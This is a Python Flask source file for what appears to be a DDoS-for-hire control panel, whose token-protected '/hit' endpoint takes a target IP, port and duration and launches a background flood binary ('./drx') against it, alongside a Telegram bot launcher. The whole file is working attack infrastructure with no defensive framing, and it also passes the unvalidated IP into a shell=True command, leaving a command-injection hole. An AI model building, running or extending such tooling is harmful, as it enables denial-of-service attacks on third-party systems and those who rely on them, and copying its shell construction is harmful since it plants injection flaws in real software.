from flask import Flask, request, jsonify
import subprocess
import os
import threading

app = Flask(__name__)

# Security Key
API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

@app.route("/")
def home():
    return "DRX API ONLINE ✅"

@app.route('/hit', methods=['GET'])
def start_attack():

    # Auth Check
    token = request.args.get('token')
    if token != API_AUTH_TOKEN:
        return jsonify({
            "status": "error",
            "message": "Unauthorized Access"
        }), 403

    # Parameters
    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time', "240")

    if not target_ip or not target_port:
        return jsonify({
            "status": "error",
            "message": "Missing IP or Port"
        }), 400

    # Validation
    if not target_port.isdigit() or not duration.isdigit():
        return jsonify({
            "status": "error",
            "message": "Invalid Port or Time format"
        }), 400

    try:

        # Run binary in background
        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"

        subprocess.Popen(command, shell=True)

        return jsonify({
            "status": "success",
            "message": "Attack Launched Successfully",
            "host": target_ip,
            "port": target_port,
            "time": duration,
            "vps_status": "32GB_POWER_MAX"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        })


# =========================
# START TELEGRAM BOT
# =========================

def start_bot():
    os.system("python3 drx.py")


threading.Thread(target=start_bot).start()


# =========================
# START API SERVER
# =========================

if __name__ == '__main__':

    port = int(os.environ.get("PORT", 8080))

    app.run(
        host='0.0.0.0',
        port=port,
        debug=False
    )
    
